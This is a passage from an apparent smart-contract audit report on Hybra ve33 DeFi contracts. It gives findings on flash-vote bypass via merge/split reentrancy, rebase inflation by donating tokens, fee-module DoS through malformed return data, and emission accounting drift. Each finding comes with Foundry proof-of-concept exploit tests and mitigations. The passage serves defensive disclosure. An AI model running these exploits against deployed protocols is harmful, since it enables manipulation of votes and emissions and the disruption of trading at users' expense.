5) Attacker withdraws only a portion of their shares (not 100%) so that remainingAmount > 0 and multiSplit succeeds.
6) GrowthHYBR splits the veNFT into [remaining, user, fee] parts and transfers the fee veNFT to Team, which is address(0).
7) Observe that VotingEscrow.ownerOf(feeTokenId) == address(0) and the fee veNFT still holds a positive locked amount, proving protocol fees are permanently lost.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GrowthHYBR} from "contracts/GovernanceHYBR.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";
import {HYBR} from "contracts/HYBR.sol";
import {HybraTimeLibrary} from "contracts/libraries/HybraTimeLibrary.sol";

contract FeeVeNftBurnWhenTeamUnsetTest is Test {
    GrowthHYBR g;
    HYBR h;
    VotingEscrow ve;
    address attacker = address(0xA11CE);

    function setUp() public {
        // Deploy core
        h = new HYBR();
        ve = new VotingEscrow(address(h), address(1)); // art proxy dummy
        g = new GrowthHYBR(address(h), address(ve));   // Team intentionally left unset (== address(0))

        // Enable split so GrowthHYBR.withdraw can call multiSplit
        ve.toggleSplit(address(0), true); // global permission by team (team == deployer in constructor)

        // Fund attacker and approve
        h.mint(attacker, 100e18);
        vm.startPrank(attacker);
        h.approve(address(g), type(uint256).max);
        g.deposit(100e18, attacker); // creates initial veNFT in GrowthHYBR
        vm.stopPrank();
    }

    function _warpIntoWithdrawWindow() internal {
        uint start = HybraTimeLibrary.epochStart(block.timestamp);
        // head_not_withdraw_time default is 1200, tail is 300, WEEK is 1800 in this test build
        vm.warp(start + 1201); // inside allowed window
    }

    function test_feeVeNftSentToZeroWhenTeamUnset() public {
        _warpIntoWithdrawWindow();

        vm.startPrank(attacker);
        uint256 userShares = g.balanceOf(attacker);
        // Withdraw a portion so remainingAmount > 0 and multiSplit weights are all > 0
        uint256 partialShares = userShares / 2;
        uint256 userTokenId = g.withdraw(partialShares);
        vm.stopPrank();

        // In VotingEscrow.multiSplit, new tokenIds are minted sequentially in order:
        // [remaining, user, fee]. So feeTokenId = userTokenId + 1 in this setup.
        uint256 feeTokenId = userTokenId + 1;

        // Fee NFT owner is zero because Team was never set
        assertEq(ve.ownerOf(feeTokenId), address(0), "fee veNFT owner should be zero");

        // And it still holds locked value (> 0), proving fees are lost
        (int128 amt,,) = ve.locked(feeTokenId);
        assertGt(uint(uint128(amt)), 0, "fee veNFT must hold positive locked amount");
    }
}

## Suggested Mitigation
In GrowthHYBR.withdraw, prevent sending the fee veNFT to address(0). Options: (a) require(Team != address(0) || feeAmount == 0) so withdrawals with a fee revert until Team is configured; (b) if Team == address(0), add the fee portion back into remainingAmount and only split into [remaining, user], skipping the fee leg; (c) set a safe non-zero default for Team in the constructor (e.g., owner()) and allow updating via setTeam. Additionally, consider adding a guard in VotingEscrow._transferFrom to forbid _to == address(0) to avoid accidental burns across the system.





 **Derived From** : ownership_change[_tokenId] == block.number => balanceOfNFT(_tokenId) == 0

## [M-25]. Flash-vote protection bypass: in-block merge/multiSplit restores voting power despite same-block transfer

## Derived From Pattern/Invariant
ownership_change[_tokenId] == block.number => balanceOfNFT(_tokenId) == 0

## Exploit Type
AccountingInvariantViolation

## Location
VotingEscrow.safeTransferFrom

## Minimim Privilege Required
Permissionless

## Description
VotingEscrow enforces flash-vote protection by setting ownership_change[tokenId] = block.number inside _transferFrom and making balanceOfNFT() return 0 when read in the same block. However, after a same-block transfer, the new owner can immediately call merge() or multiSplit() (both callable by the new owner and without additional epoch guards). These operations burn the just-transferred tokenId and mint or credit voting power to other tokenIds that are NOT marked in ownership_change. As a result, the receiver regains full voting power in the same block via the fresh tokenIds (merge to an existing tokenId, or new tokenIds from multiSplit), defeating the intended state-machine guard against same-block vote activation. Vulnerable snippets: 1) _transferFrom(...){ ownership_change[_tokenId] = block.number; } 2) merge(_from,_to) burns _from and increases _to; multiSplit(_from, amounts[]) burns _from and mints new tokenIds; neither propagates ownership_change to the target/new tokenIds.

## Impact
Attacker can transfer a veNFT and instantly restore usable voting power via merge or split in the same block, enabling just-in-time voting/weight manipulation (e.g., to sway gauge weights or claim-dependent mechanics) that the flash-vote guard was meant to prevent.

## Proof of Concept
Pre-conditions: Attacker controls veNFT A and veNFT B (both active). The protocol’s flash-vote guard sets ownership_change[tokenId] = block.number on transfer and balanceOfNFT(tokenId) returns 0 if ownership_change[tokenId] == block.number.

Attack (merge path, no special permissions required):
1) Attacker deploys a receiver contract R implementing onERC721Received that, upon receiving a veNFT, calls ve.merge(_from, B).
2) Attacker approves R for token B (ve.approve(R, B)) so R is _isApprovedOrOwner for B.
3) Attacker safeTransferFrom(attacker, R, A). Inside onERC721Received, R now owns A and is approved for B, so merge(A, B) succeeds. Token A is burned; weight is credited to B.
4) Because B’s ownership_change was not touched in this block, balanceOfNFT(B) > 0 immediately within the same tx, bypassing the intended same-block zeroing of voting power for A.
5) Attacker can then call Voter.vote with B in the same transaction to perform just-in-time voting.

Variant (split path, requires split permission enabled: canSplit[address(0)] = true or receiver whitelisted):
1) Attacker deploys a receiver contract S that, in onERC721Received, calls ve.multiSplit(A, [w1, w2, ...]).
2) Attacker safeTransferFrom(attacker, S, A). In callback, multiSplit burns A and mints fresh tokenIds to S without setting ownership_change on the new ids.
3) balanceOfNFT(newId) > 0 in the same block (recordable during the callback), re-enabling voting power immediately via new tokenIds.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {VotingEscrow} from "ve33/contracts/VotingEscrow.sol";

contract MockERC20 {
    string public name = "MOCK"; string public symbol = "MOCK"; uint8 public decimals = 18;
    mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    function mint(address to, uint amt) external { balanceOf[to]+=amt; }
    function approve(address sp, uint amt) external returns (bool){ allowance[msg.sender][sp]=amt; return true; }
    function transfer(address to, uint amt) external returns(bool){ require(balanceOf[msg.sender]>=amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address f,address t,uint amt) external returns(bool){ require(balanceOf[f]>=amt && allowance[f][msg.sender]>=amt, "allow"); allowance[f][msg.sender]-=amt; balanceOf[f]-=amt; balanceOf[t]+=amt; return true; }
}

contract AttackReceiver is IERC721Receiver {
    VotingEscrow public ve;
    uint public mergeTargetId;
    bool public doSplit;
    uint[] private splitAmts;
    uint public lastNewId0;
    uint public balDuringCallback;

    constructor(VotingEscrow _ve, bool _doSplit, uint[] memory _amts){
        ve = _ve; doSplit = _doSplit; 
        for (uint i; i < _amts.length; i++) splitAmts.push(_amts[i]);
    }
    function setMergeTarget(uint id) external { mergeTargetId = id; }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        if (doSplit) {
            uint[] memory amts = new uint[](splitAmts.length);
            for (uint i; i < amts.length; i++) amts[i] = splitAmts[i];
            uint[] memory ids = ve.multiSplit(tokenId, amts);
            lastNewId0 = ids[0];
            balDuringCallback = ve.balanceOfNFT(lastNewId0); // > 0 in same block
        } else {
            ve.merge(tokenId, mergeTargetId);
            balDuringCallback = ve.balanceOfNFT(mergeTargetId); // > 0 in same block
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract FlashVoteBypassTest is Test {
    MockERC20 token; VotingEscrow ve;
    address attacker = address(0xA11CE);

    function setUp() public {
        token = new MockERC20();
        ve = new VotingEscrow(address(token), address(this));
        token.mint(attacker, 1e24);
        vm.startPrank(attacker);
        token.approve(address(ve), type(uint).max);
        vm.stopPrank();
    }

    function _createLockAs(address who, uint amt, uint dur) internal returns (uint id) {
        vm.startPrank(who);
        id = ve.create_lock(amt, dur);
        vm.stopPrank();
    }

    function test_BypassFlashVote_viaMergeSameBlock() public {
        uint lockDur = 4 weeks;
        // Deploy receiver (merge mode)
        AttackReceiver recv = new AttackReceiver(ve, false, new uint[](0));
        // Attacker creates target token B and approve receiver for it
        uint idB = _createLockAs(attacker, 5e21, lockDur);
        vm.prank(attacker); ve.approve(address(recv), idB);
        recv.setMergeTarget(idB);
        // Attacker creates source token A
        uint idA = _createLockAs(attacker, 5e21, lockDur);
        // Same-tx transfer triggers onERC721Received -> merge(A->B)
        vm.prank(attacker);
        ve.safeTransferFrom(attacker, address(recv), idA);
        // During the same block, receiver observed non-zero balance on B
        assertGt(recv.balDuringCallback(), 0, "merge target has zero voting power in same block");
    }

    function test_BypassFlashVote_viaSplitSameBlock() public {
        uint lockDur = 4 weeks;
        // Enable global split permission as team
        vm.prank(address(this)); ve.toggleSplit(address(0), true);
        // Receiver in split mode with two outputs
        uint[] memory amts = new uint[](2); amts[0]=1; amts[1]=1;
        AttackReceiver recvS = new AttackReceiver(ve, true, amts);
        // Create source A and transfer to receiver (reentrant split)
        uint idA = _createLockAs(attacker, 5e21, lockDur);
        vm.prank(attacker);
        ve.safeTransferFrom(attacker, address(recvS), idA);
        // New split token observed with >0 voting power in same block
        assertGt(recvS.balDuringCallback(), 0, "split token has zero voting power in same block");
    }
}

## Suggested Mitigation
Propagate the same-block guard to derived operations. Specifically:
- In merge(_from, _to): if (ownership_change[_from] == block.number) { ownership_change[_to] = block.number; }
  Place this after updating locked[_to] (and before emitting).
- In multiSplit(_from, amounts): after minting each new tokenId inside the loop, if (ownership_change[_from] == block.number) { ownership_change[newTokenId] = block.number; }
This ensures any voting power resulting from a token transferred in the current block remains unusable until the next block, preserving the flash-vote protection across merge/split workflows.





 **Derived From** : calculate_rebase(_weeklyMint) <= (_weeklyMint * REBASEMAX) / MAX_BPS and calculate_rebase(_weeklyMint) <= _weeklyMint

## [H-26]. Anyone can inflate rebase by donating HYBR to VotingEscrow, siphoning weekly emissions from gauges to ve holders up to REBASEMAX

## Derived From Pattern/Invariant
calculate_rebase(_weeklyMint) <= (_weeklyMint * REBASEMAX) / MAX_BPS and calculate_rebase(_weeklyMint) <= _weeklyMint

## Exploit Type
AccountingInvariantViolation

## Location
MinterUpgradeable.calculate_rebase

## Minimim Privilege Required
Permissionless

## Description
MinterUpgradeable.calculate_rebase computes lockedShare using the ERC20 balance of the ve contract address: _veTotal = _hybr.balanceOf(address(_ve)); lockedShare = (_veTotal * MAX_BPS) / _hybrTotal. This treats any HYBR sitting at the ve contract as "locked", even if it was sent directly and is not associated with any veNFT. An attacker can permissionlessly transfer HYBR to the VotingEscrow contract to inflate lockedShare without increasing ve stake, pushing rebase to REBASEMAX and diverting emissions from gauges to the RewardsDistributor. If the attacker also holds (even a small) veNFT and sets a short lock, they can claim the inflated rebase as liquid HYBR after expiry. Vulnerable snippet:

function calculate_rebase(uint _weeklyMint) public view returns (uint) {
    uint _veTotal = _hybr.balanceOf(address(_ve));
    uint _hybrTotal = _hybr.totalSupply();
    uint lockedShare = (_veTotal) * MAX_BPS  / _hybrTotal;
    if(lockedShare >= REBASEMAX){
        return _weeklyMint * REBASEMAX / MAX_BPS;
    } else {
        return _weeklyMint * lockedShare / MAX_BPS;
    }
}

Because _veTotal counts raw token balance, not actual locked amount (sum of ve positions), the arithmetic relationship between true-locked and supply is broken, enabling rebase inflation and emission misallocation.

## Impact
Functional/monetary: Attacker can max out rebase (up to REBASEMAX of weekly mint), diverting large weekly emissions from gauges to ve holders. With a short-dated lock they can realize this as liquid HYBR after epoch rollover. LP rewards shrink materially; attacker profits in HYBR emissions disproportionately to any economic stake.

## Proof of Concept
1) Acquire HYBR and create a minimal ve lock (e.g., 1 week) to get a veNFT.
2) Before the next epoch update, transfer a large amount of HYBR directly to the VotingEscrow contract address (not via deposit_for). This raises _hybr.balanceOf(address(_ve)) but does not increase anyone’s veNFT balance.
3) When Minter.update_period() runs, calculate_rebase uses the inflated _veTotal/totalSupply ratio and mints a much larger rebase (capped by REBASEMAX). That emission is transferred to RewardsDistributor.
4) After the epoch ends and the lock expires, call RewardsDistributor.claim(tokenId). Since the lock is expired, claim sends HYBR directly to the owner (liquid). The claimed amount far exceeds the donation when weekly emissions are large and supply is small (or even at normal supply if REBASEMAX is reached).

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {MinterUpgradeable} from "ve33/contracts/MinterUpgradeable.sol";
import {RewardsDistributor} from "ve33/contracts/RewardsDistributor.sol";
import {VotingEscrow} from "ve33/contracts/VotingEscrow.sol";
import {IVeArtProxy} from "ve33/contracts/interfaces/IVeArtProxy.sol";
import {IHybra} from "ve33/contracts/interfaces/IHybra.sol";
import {HybraTimeLibrary} from "ve33/contracts/libraries/HybraTimeLibrary.sol";

contract ArtProxyStub is IVeArtProxy {
    function _tokenURI(uint, uint, uint, uint) external pure returns (string memory) { return ""; }
}

contract GaugeManagerStub {
    uint256 public last;
    function notifyRewardAmount(uint256 amount) external { last = amount; }
}

contract MockHYBR is IHybra {
    string public constant name = "HYBR"; string public constant symbol = "HYBR"; uint8 public constant decimals = 18;
    uint public override totalSupply;
    mapping(address=>uint) public override balanceOf;
    mapping(address=>mapping(address=>uint)) public allowance;
    address public override minter;
    function setMinter(address m) external { minter = m; }
    function approve(address s, uint v) external override returns (bool){ allowance[msg.sender][s]=v; return true; }
    function transfer(address to, uint v) external override returns(bool){ require(balanceOf[msg.sender]>=v,"bal"); balanceOf[msg.sender]-=v; balanceOf[to]+=v; return true; }
    function transferFrom(address f,address t,uint v) external override returns(bool){ require(allowance[f][msg.sender]>=v,"alw"); require(balanceOf[f]>=v,"bal"); allowance[f][msg.sender]-=v; balanceOf[f]-=v; balanceOf[t]+=v; return true; }
    function mint(address to, uint v) external override returns(bool){ require(msg.sender==minter, "not minter"); totalSupply+=v; balanceOf[to]+=v; return true; }
    function burn(uint) external override returns (bool){ revert(); }
    function burnFrom(address, uint) external override returns (bool){ revert(); }
}

contract RebaseDonationExploitTest is Test {
    MockHYBR token;
    VotingEscrow ve;
    RewardsDistributor rd;
    MinterUpgradeable minter;
    GaugeManagerStub gm;
    ArtProxyStub art;

    uint tokenId;
    address attacker;

    function setUp() public {
        attacker = address(this);
        token = new MockHYBR();
        art = new ArtProxyStub();
        ve = new VotingEscrow(address(token), address(art));
        rd = new RewardsDistributor(address(ve));
        gm = new GaugeManagerStub();
        minter = new MinterUpgradeable();
        minter.initialize(address(gm), address(ve), address(rd));

        // Make RD accept checkpoint_token() from minter
        rd.setDepositor(address(minter));

        // Mint initial HYBR to attacker to create a lock and to donate later
        token.setMinter(address(this));
        token.mint(attacker, 100 ether);
        token.approve(address(ve), type(uint).max);

        // Create a 1-week lock so rewards can be paid out as liquid after expiry
        tokenId = ve.create_lock(10 ether, HybraTimeLibrary.WEEK);

        // Hand minting rights to the Minter for emissions
        token.setMinter(address(minter));

        // Finalize minter and open epoch
        address[] memory c; uint[] memory a;
        minter._initialize(c, a, 0);
    }

    function _warpToNextEpoch() internal {
        uint ap = minter.active_period();
        // ensure we are past the next epoch boundary
        vm.warp(ap + HybraTimeLibrary.WEEK + 1);
    }

    function testDonateToVEInflatesRebaseAndProfits() public {
        // Baseline first epoch (no donation)
        _warpToNextEpoch();
        minter.update_period();

        // Attack: donate HYBR directly to VotingEscrow (not via deposit_for)
        // This increases _hybr.balanceOf(address(ve)) but not ve balances
        token.transfer(address(ve), 20 ether);

        // Next epoch: rebase should spike (towards REBASEMAX cap)
        _warpToNextEpoch();
        minter.update_period();

        // Let one more epoch pass so the 1-week lock is expired when claiming
        _warpToNextEpoch();
        uint pre = token.balanceOf(attacker);
        uint claimed = rd.claim(tokenId);

        // Attacker gets liquid HYBR because lock is expired
        assertGt(claimed, 0, "should claim something");
        assertEq(token.balanceOf(attacker), pre + claimed, "liquid HYBR received");

        // With small initial supply and large weekly, claimed >> donation
        // (weekly starts at 2.6M * 1e18 in Minter; REBASE cap is 30%)
        assertGt(claimed, 20 ether, "profit exceeds donated HYBR");
    }
}


## Suggested Mitigation
Use the actual locked amount tracked by VotingEscrow instead of the ERC20 balance at the ve contract. Two safe options: (a) query VotingEscrow.supply() (the sum of all locked deposits) for the numerator, or (b) maintain an internal accounting of locked HYBR amounts and exclude any raw transfers to the ve contract. Concretely, replace _veTotal = _hybr.balanceOf(address(_ve)) with _veTotal = IVotingEscrow(_ve).supply(). Optionally, add a rescue for mistakenly sent HYBR and reject raw transfers in the HYBR token (or periodically sweep to a burn address) so balanceOf(ve) cannot be manipulated.





 **Derived From** : Fee module callbacks can grief by returning malformed data causing decode revert

## [L-27]. Griefable fee-module response lets abi.decode revert in CLFactory.getSwapFee/Unstaked/ProtocolFee, bricking CLPool fee() and swaps

## Derived From Pattern/Invariant
Fee module callbacks can grief by returning malformed data causing decode revert

## Exploit Type
Dos

## Location
CLFactory.getSwapFee / getUnstakedFee / getProtocolFee

## Minimim Privilege Required
RequiresRole

## Description
CLFactory delegates fee reads to external fee modules via excessivelySafeStaticCall, then immediately abi.decode(data,(uint24)) on success without verifying data.length. A misbehaving/compromised module can return success with <32 bytes (e.g., empty fallback) so abi.decode reverts. This DoS propagates to CLPool because swap(), flash(), and fee/fee-split paths call factory getters (fee(), unstakedFee(), protocolFee()), bricking swaps/flash and fee accounting across pools.

Vulnerable pattern (all three getters are similar):

(bool success, bytes memory data) = swapFeeModule.excessivelySafeStaticCall(200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool));
if (success) {
    uint24 fee = abi.decode(data, (uint24)); // reverts if data.length < 32
    if (fee <= 100_000) {
        return fee;
    }
}

## Impact
If a privileged fee module (swap/unstaked/protocol) is misconfigured, buggy, or compromised to return success with short/empty returndata, abi.decode reverts in CLFactory getters, which bricks CLPool.fee()/swap()/flash. This is a functional DoS but only reachable via a trusted/privileged module misbehaving; under the stated trust model for admin roles, this is a hardening flaw rather than an unprivileged exploit.

## Proof of Concept
Attack precondition: the swapFeeManager (privileged) sets swapFeeModule (or unstaked/protocol module) to a contract that returns success with 0-length returndata for IFeeModule.getFee(pool).
Steps:
1) Fee manager sets module to MaliciousFeeModule whose fallback does `return(0,0)`.
2) CLFactory.getSwapFee(pool) calls `excessivelySafeStaticCall(..., maxCopy=32, ...)` which returns (success=true, data="").
3) The subsequent `abi.decode(data,(uint24))` reverts because `data.length < 32`.
4) CLPool.fee() -> factory.getSwapFee() now reverts; swap() and flash() that read fee also revert, effectively halting trading on affected pools.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.6;

import "ds-test/test.sol";
import "contracts/core/CLFactory.sol";
import "contracts/core/CLPool.sol";

contract MaliciousFeeModule {
    // Always "succeeds" with empty return data so abi.decode in factory reverts
    fallback() external view {
        assembly { return(0, 0) }
    }
}

contract FeeModuleGriefTest is DSTest {
    function test_griefing_short_return_bricks_factory_and_pool_fee() public {
        // Deploy pool implementation and factory
        CLPool impl = new CLPool();
        CLFactory factory = new CLFactory(address(impl));

        // swapFeeManager defaults to msg.sender (this test contract)
        MaliciousFeeModule mod = new MaliciousFeeModule();
        factory.setSwapFeeModule(address(mod));

        // 1) Factory getter reverts due to abi.decode on empty returndata
        (bool ok1, ) = address(factory).staticcall(
            abi.encodeWithSelector(factory.getSwapFee.selector, address(0xBEEF))
        );
        assertTrue(!ok1, "getSwapFee should revert on short return");

        // 2) A pool that queries factory fee() is also bricked
        CLPool pool = new CLPool();
        uint160 sqrtPriceX96 = 79228162514264337593543950336; // 2**96
        pool.initialize(address(factory), address(0x1), address(0x2), int24(1), address(0), sqrtPriceX96);

        (bool ok2, ) = address(pool).staticcall(abi.encodeWithSignature("fee()"));
        assertTrue(!ok2, "CLPool.fee() should revert when factory decode fails");
    }
}


## Suggested Mitigation
Defensively validate returndata length before decoding for all three getters. Only decode when `success && data.length == 32`, otherwise fall back to defaults. Example (apply similarly to getUnstakedFee/getProtocolFee):

// getSwapFee
if (swapFeeModule != address(0)) {
    (bool success, bytes memory data) = swapFeeModule.excessivelySafeStaticCall(
        200_000,
        32,
        abi.encodeWithSelector(IFeeModule.getFee.selector, pool)
    );
    if (success && data.length == 32) {
        uint24 fee = abi.decode(data, (uint24));
        if (fee <= 100_000) return fee;
    }
}
return tickSpacingToFee[CLPool(pool).tickSpacing()];

For getUnstakedFee/getProtocolFee, retain the existing caps (1_000_000 and 500_000 respectively) and add the same `data.length == 32` guard. Additionally, to avoid unrelated decode hazards, guard gaugeManager usage (e.g., skip the gauge alive check if `address(gaugeManager) == address(0)` and fall back to defaults). This removes the griefing vector without weakening the plugin architecture. Note: try/catch cannot wrap abi.decode in Solidity 0.7.6; rely on length checks or assembly.


## [M-28]. External fee module can return short data to brick CLFactory.getSwapFee/getUnstakedFee/getProtocolFee and DoS all swaps/flash

## Derived From Pattern/Invariant
Fee module callbacks can grief by returning malformed data causing decode revert

## Exploit Type
Dos

## Location
CLFactory.getSwapFee

## Minimim Privilege Required
RequiresRole

## Description
CLFactory’s getSwapFee, getUnstakedFee, and getProtocolFee call untrusted external fee modules via ExcessivelySafeCall and immediately abi.decode(data,(uint24)) without verifying data.length == 32. A misbehaving or compromised fee module can return fewer than 32 bytes (e.g., via fallback with abi.encodePacked(uint24(...))) and still have success=true, causing abi.decode to revert. This reverts the getters and in turn bricks CLPool.swap() and flash(), which read fees via fee()/unstakedFee()/protocolFee().

Vulnerable pattern (present in all three getters):

(bool success, bytes memory data) = module.excessivelySafeStaticCall(200000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool));
if (success) {
    uint24 fee = abi.decode(data, (uint24)); // no data.length check
    if (fee <= cap) return fee;
}

Because decode is unconditional on data length, any short return data DoS’s core reads, breaking swaps across pools that rely on these values.

## Impact
Functional DoS of trading and flash loans across CL pools; users cannot swap or flash as fee reads revert. Protocol fee collection paths depending on these getters are also impacted.

## Proof of Concept
A fee module is set by the authorized manager as part of normal configuration. If that module returns a short, non-ABI-encoded payload (e.g., via fallback returning abi.encodePacked(uint24(...)) = 3 bytes), the call via ExcessivelySafeCall can still succeed and return those 3 bytes. CLFactory.getSwapFee/getUnstakedFee/getProtocolFee then immediately abi.decode(data,(uint24)) without checking data.length == 32, causing a revert. This revert hits every pool path that reads fees: CLPool.swap() uses fee() which calls factory.getSwapFee; flash() uses the same fee(); and applyUnstakedFees() calls into factory.getProtocolFee/getUnstakedFee. Result: swaps and flash loans revert across affected pools if the misbehaving module is configured.

## Proof of Code
/// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "ds-test/test.sol";
import {CLFactory} from "contracts/core/CLFactory.sol";
import {CLPool} from "contracts/core/CLPool.sol";
import {IFeeModule} from "contracts/core/interfaces/fees/IFeeModule.sol";

contract MaliciousFeeModule {
    // No getFee function; fallback returns short (3 bytes) instead of 32-byte ABI word
    fallback() external view returns (bytes memory) {
        return abi.encodePacked(uint24(3000));
    }
}

contract GaugeManagerStub {
    bool public alive;
    function setAlive(bool a) external { alive = a; }
    function isGaugeAliveForPool(address) external view returns (bool) { return alive; }
}

contract ShortReturnFeeGriefTest is DSTest {
    CLFactory factory;
    CLPool pool;
    MaliciousFeeModule mal;
    GaugeManagerStub gm;

    function setUp() public {
        factory = new CLFactory(address(0xdead));
        mal = new MaliciousFeeModule();
        gm = new GaugeManagerStub();

        // wire gauge manager
        factory.setGaugeManager(address(gm));

        // managers default to msg.sender in constructor; set malicious modules
        factory.setSwapFeeModule(address(mal));
        factory.setUnstakedFeeModule(address(mal));
        factory.setProtocolFeeModule(address(mal));
    }

    function test_getSwapFee_reverts_onShortReturn() public {
        (bool ok,) = address(factory).staticcall(
            abi.encodeWithSelector(factory.getSwapFee.selector, address(0xBEEF))
        );
        assertTrue(!ok, "getSwapFee should revert due to short return data");
    }

    function test_getUnstakedFee_reverts_onShortReturn_whenGaugeAlive() public {
        gm.setAlive(true); // unstaked path executes
        (bool ok,) = address(factory).staticcall(
            abi.encodeWithSelector(factory.getUnstakedFee.selector, address(0xBEEF))
        );
        assertTrue(!ok, "getUnstakedFee should revert due to short return data");
    }

    function test_getProtocolFee_reverts_onShortReturn_whenGaugeDead() public {
        gm.setAlive(false); // protocol fee path executes
        (bool ok,) = address(factory).staticcall(
            abi.encodeWithSelector(factory.getProtocolFee.selector, address(0xBEEF))
        );
        assertTrue(!ok, "getProtocolFee should revert due to short return data");
    }

    function test_pool_fee_reverts_propagates_DoS() public {
        // Deploy a pool pointing to our factory; fee() will query factory and revert
        pool = new CLPool();
        // sqrtPriceX96 = 2^96
        pool.initialize(address(factory), address(0x1), address(0x2), int24(100), address(0x0), uint160(79228162514264337593543950336));
        (bool ok,) = address(pool).staticcall(abi.encodeWithSelector(pool.fee.selector));
        assertTrue(!ok, "CLPool.fee should revert due to bad module return data");
    }
}


## Suggested Mitigation
Defensively validate return data before decoding. Require success && data.length == 32 and only then decode; otherwise ignore the module output and fall back to safe defaults/caps. Example pattern for all three getters:

(bool success, bytes memory data) = module.excessivelySafeStaticCall(200000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool));
if (success && data.length == 32) {
    uint24 fee = abi.decode(data, (uint24));
    if (fee <= cap) return fee;
}
// fallback to defaults if call failed, data malformed, or cap exceeded

Apply the same check in getSwapFee (cap 100_000, fallback tickSpacingToFee), getUnstakedFee (cap 1_000_000, fallback defaultUnstakedFee), and getProtocolFee (cap 500_000, fallback defaultProtocolFee). This preserves robustness against misbehaving or malicious external modules.





 **Derived From** : Emission accounting mismatch (no epoch snapshot) can break conservation and DoS payouts

## [M-29]. GaugeManager distribution uses live weights while index minted on old totalWeight, enabling DoS and emission drift

## Derived From Pattern/Invariant
Emission accounting mismatch (no epoch snapshot) can break conservation and DoS payouts

## Exploit Type
AccountingInvariantViolation

## Location
GaugeManager.notifyRewardAmount / _updateForAfterDistribution / distribute

## Minimim Privilege Required
Permissionless

## Description
GaugeManager.notifyRewardAmount computes index using IVoter.totalWeight() at mint time. Later, _updateForAfterDistribution uses IVoter.weights(pool) read live without an epoch snapshot. If weights increase after notify but before distribute, a gauge’s computed share becomes amount * (w_new / W0), which can exceed the HYBR actually deposited into GaugeManager (amount). When distribute([gauge]) calls gauge.notifyRewardAmount, the gauge attempts to transfer more HYBR than GaugeManager holds, causing a revert and DoS of distribution. Conversely, if totalWeight decreases, sum(claimable) < minted, stranding HYBR in GaugeManager.

Vulnerable snippets:
- notifyRewardAmount: index += amount * 1e18 / totalWeight; // totalWeight at notify
- _updateForAfterDistribution: _supplied = IVoter(voter).weights(_pool); // live per-pool weights

Because no per-epoch weight snapshot binds distribution to the same weights used at mint, conservation of emissions breaks and distributions can revert.

## Impact
Because notifyRewardAmount() computes index using the totalWeight at mint time while _updateForAfterDistribution() reads live per-pool weights later, any vote changes between notify and distribute break conservation. If weights grow (W1 > W0), a gauge’s computed share can exceed the HYBR deposited, causing gauge.notifyRewardAmount() to revert on transferFrom and DoS that gauge’s distribution (and any bulk distribution call including it). If weights shrink (W1 < W0), a portion of HYBR remains stranded in GaugeManager, drifting emissions away from the minted amount. Funds are not stolen but distributions can be blocked and accounting diverges.

## Proof of Concept
High-level PoC steps (no storage hacks, realistic flow):
1) At t0, Minter calls GaugeManager.notifyRewardAmount(A), reading totalWeight=W0 and setting index += A * 1e18 / W0. HYBR A is transferred from Minter → GaugeManager.
2) Before distribution for the epoch, the attacker revotes to increase their pool’s weight to w_new and (accordingly) totalWeight=W1 > W0.
3) The attacker calls distribute([theirGauge]) any time later in the epoch. _updateForAfterDistribution() uses live w_new and computes claimable = w_new * (index - supplyIndex[g]) / 1e18 = w_new * A / W0. Since W1 ≥ w_new and W1 > W0, claimable > A is feasible.
4) Gauge.notifyRewardAmount(base, claimable) pulls claimable tokens from GaugeManager. GaugeManager only holds A for that epoch, so transferFrom reverts due to insufficient balance. Distribution is DoS’d; with W1 < W0, leftover HYBR accumulates in GaugeManager instead.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "contracts/GaugeManager.sol";
import {IERC20Upgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";

contract MockERC20 is IERC20Upgradeable {
    string public name = "MOCK";
    string public symbol = "M";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public override allowance;
    event Transfer(address indexed from,address indexed to,uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    function mint(address to,uint256 amt) external { balanceOf[to]+=amt; totalSupply+=amt; emit Transfer(address(0),to,amt);}    
    function transfer(address to,uint256 amt) external override returns(bool){ require(balanceOf[msg.sender]>=amt, "BAL"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; emit Transfer(msg.sender,to,amt); return true; }
    function approve(address sp,uint256 amt) external override returns(bool){ allowance[msg.sender][sp]=amt; emit Approval(msg.sender,sp,amt); return true; }
    function transferFrom(address from,address to,uint256 amt) external override returns(bool){ require(balanceOf[from]>=amt, "BAL"); require(allowance[from][msg.sender]>=amt, "ALLOW"); allowance[from][msg.sender]-=amt; balanceOf[from]-=amt; balanceOf[to]+=amt; emit Transfer(from,to,amt); return true; }
}

contract MockVE {
    address public tokenAddr;
    constructor(address t){ tokenAddr=t; }
    function token() external view returns(address){ return tokenAddr; }
}

contract MockPermissionsRegistry {
    function hasRole(bytes memory, address) external pure returns(bool){ return true; }
    function emergencyCouncil() external view returns(address){ return address(0); }
    function hybraTeamMultisig() external view returns(address){ return address(0); }
}

contract MockVoter {
    uint256 public totalW;
    mapping(address=>uint256) public w;
    function setTotalWeight(uint256 t) external { totalW = t; }
    function setWeight(address pool, uint256 wt) external { w[pool]=wt; }
    function totalWeight() external view returns(uint256){ return totalW; }
    function weights(address pool) external view returns(uint256){ return w[pool]; }
    function _ve() external view returns(address){ return address(0); }
}

interface IGaugeLike {
    function emergency() external view returns (bool);
    function notifyRewardAmount(address token, uint256 amt) external;
}

contract MockGauge is IGaugeLike {
    address public distribution;
    bool public emer;
    constructor(address distro){ distribution=distro; }
